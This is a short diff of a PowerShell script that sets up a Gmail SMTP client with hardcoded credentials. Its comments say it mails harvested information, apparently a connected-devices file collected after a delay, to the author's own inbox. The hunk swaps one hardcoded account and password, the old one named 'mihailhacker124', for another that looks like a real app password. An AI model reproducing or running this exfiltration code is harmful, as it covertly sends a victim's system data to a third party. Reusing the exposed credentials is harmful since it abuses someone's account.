@@ -14,7 +14,7 @@ Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file tak
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('mihailhacker124@gmail.com', 'mihailhackersus163') #Email with which you want to send information
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('mishustick34@gmail.com', 'ftqhziwcjgrtgczm') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'mishustick34@gmail.com' #Email in which you want to receice the information
 $ReportEmail.To.Add('mishustick34@gmail.com') #Email in which you want to receive the information
